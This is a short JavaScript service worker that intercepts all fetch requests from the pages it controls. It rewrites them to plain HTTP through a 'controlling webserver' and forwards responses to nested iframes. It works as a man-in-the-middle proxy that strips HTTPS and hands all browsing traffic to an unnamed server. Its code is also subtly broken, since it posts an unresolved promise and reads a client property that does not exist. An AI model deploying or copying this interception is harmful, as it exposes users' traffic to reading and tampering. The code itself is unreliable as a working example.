self.addEventListener('message', (event) => {
  if (event.data && event.data.action === 'openWebsite') {
    const url = event.data.url;
    if (url) {
      openWebsite(url);
    }
  }
});

async function openWebsite(url) {
  const webserverIP = ''; // IP address of the controlling webserver
  const modifiedRequest = new Request(url.replace(/^https?:\/\//, 'http://' + webserverIP + '/'));
  
  const response = await fetch(modifiedRequest);

  // Get the iframe element from the client page
  self.clients.matchAll().then((clients) => {
    clients.forEach((client) => {
      if (client.frameType === 'nested' && client.frameId !== '') {
        client.postMessage({ action: 'updateIframe', response: response.clone().text(), url });
      }
    });
  });
}

self.addEventListener('fetch', (event) => {
  event.respondWith(fetchAndModify(event.request));
});

async function fetchAndModify(request) {
  const webserverIP = ''; // IP address of the controlling webserver
  const modifiedRequest = new Request(request.url.replace(/^https?:\/\//, 'http://' + webserverIP + '/'));

  return fetch(modifiedRequest);
}
